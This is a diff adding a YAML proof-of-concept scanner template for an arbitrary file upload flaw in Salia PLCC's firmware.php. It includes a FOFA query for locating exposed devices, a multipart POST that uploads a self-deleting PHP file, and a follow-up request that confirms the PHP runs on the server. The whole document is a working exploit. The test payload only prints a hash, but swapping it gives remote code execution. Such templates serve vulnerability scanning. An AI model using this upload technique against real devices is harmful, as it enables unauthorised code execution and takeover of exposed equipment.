@@ -1,0 +1,30 @@
+id: poc-yaml-salia-plcc-firmware-php-anyfile-upload
+info:
+  name: Salia PLCC firmware.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: salia_plcc
+  fofa: body="Salia PLCC"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /firmware.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+  data: '------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="media"; filename="{{.t1}}.php"
+
+
+    <?=md5({{.t1}});unlink(__FILE__);
+
+    ------WebKitFormBoundary--'
+  expression: status_code == 200 && contains(body,"Firmware") && contains(body,"has
+    been uploaded successfully")
+- method: GET
+  path: /uploads/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
